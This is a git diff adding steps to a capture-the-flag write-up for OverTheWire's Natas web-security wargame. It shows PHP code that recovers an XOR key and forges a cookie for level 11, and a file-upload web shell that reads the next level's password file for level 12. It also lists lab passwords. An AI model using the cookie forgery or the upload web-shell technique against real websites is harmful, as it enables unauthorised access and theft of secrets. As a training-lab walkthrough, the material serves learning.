@@ -167,6 +167,41 @@ The code for decrypting the key:
   
      return $outText;  
     }  
-    echo xor_encrypt(base64_decode($cookie));  
+    echo xor_encrypt(base64_decode($cookie)); 
+After getting the key, encode the cookie with the key using the program:
+    
+    $data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");  
+    function xor_encrypt($in) {  
+        $key = 'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq';  
+        $text = $in;  
+        $outText = '';  
   
+        // Iterate through each character  
+        for($i=0;$i<strlen($text);$i++) {  
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];  
+    }  
+  
+        return $outText;  
+    }  
+    echo base64_encode(xor_encrypt(json_encode($data)));
+You will get the proper cookie as:MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
+Change the cookie in the website and reload.
 
+We got the password!!
+
+## Natas 12
+Username: natas12
+Password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+URL:      http://natas11.natas.labs.overthewire.org
+
+By observing the website and the source code, we can upload a file to the backend and excecute commands by scripting inside the file.
+As it is looking for jpg, we are going to make a jpg file to upload.
+
+We need to store the command: <?php echo system("cat /etc/natas_webpass/natas13"); ?> inside the file.
+To input the file as a php excecutable file we change the extension from jpg to php on the inspect tab filename=suhgvsdfg.jpg.
+
+Uploading the file redirects to a hyperlink following password.
+
+## Natas 13
+Username: natas13
+Password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
